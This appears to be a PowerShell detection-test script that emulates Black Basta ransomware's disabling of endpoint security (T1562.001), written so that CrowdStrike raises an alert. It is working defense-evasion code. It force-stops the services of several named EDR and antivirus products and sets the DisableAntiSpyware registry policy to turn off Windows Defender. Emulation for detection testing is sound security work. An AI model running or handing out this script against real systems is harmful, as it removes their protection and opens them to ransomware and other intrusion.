<#
.SYNOPSIS
    Black Basta EDR Disable - DETECTION TRIGGER
.DESCRIPTION
    Attempts to stop EDR services and disable via registry.
    Will trigger EDR detection for T1562.001.
    REQUIRES ADMIN PRIVILEGES.
    TTP: T1562.001
#>
Write-Host "[*] Starting Black Basta EDR Disable (T1562.001)" -ForegroundColor Cyan
Write-Host "[*] This will trigger EDR detection for defense evasion" -ForegroundColor Yellow

try {
    # Check if running as admin
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-not $isAdmin) {
        Write-Host "[!] WARNING: Not running as Administrator - service stops will fail" -ForegroundColor Red
    }
    
    # Common EDR service names
    $edrServices = @(
        "CSFalconService",      # CrowdStrike
        "CylanceSvc",           # Cylance
        "SentinelAgent",        # SentinelOne
        "CarbonBlack",          # Carbon Black
        "WdNisSvc",             # Windows Defender NIS
        "WinDefend",            # Windows Defender
        "Sense",                # Windows Defender ATP
        "MsMpSvc"               # Microsoft Antimalware
    )
    
    foreach ($service in $edrServices) {
        Write-Host "[*] Attempting to stop service: $service"
        
        # ACTUAL DETECTION TRIGGER - Try to stop EDR services
        $svc = Get-Service -Name $service -ErrorAction SilentlyContinue
        
        if ($svc) {
            Write-Host "[*] Found service: $service (Status: $($svc.Status))"
            
            try {
                Stop-Service -Name $service -Force -ErrorAction Stop
                Write-Host "[+] SUCCESS: Stopped $service" -ForegroundColor Green
            } catch {
                Write-Host "[-] Failed to stop $service (expected - EDR protected)" -ForegroundColor Yellow
            }
        }
    }
    
    # Also try to disable via registry
    Write-Host "[*] Attempting registry-based disable..."
    
    # Disable Windows Defender via registry
    $defenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    
    try {
        if (!(Test-Path $defenderPath)) {
            New-Item -Path $defenderPath -Force | Out-Null
        }
        Set-ItemProperty -Path $defenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -ErrorAction Stop
        Write-Host "[+] Registry key set: DisableAntiSpyware = 1" -ForegroundColor Green
    } catch {
        Write-Host "[-] Registry modification blocked: $_" -ForegroundColor Yellow
    }
    
    Write-Host "[!] CrowdStrike should detect: 'DefenseEvasion' or 'SecurityToolDisabled'" -ForegroundColor Magenta
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}

Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
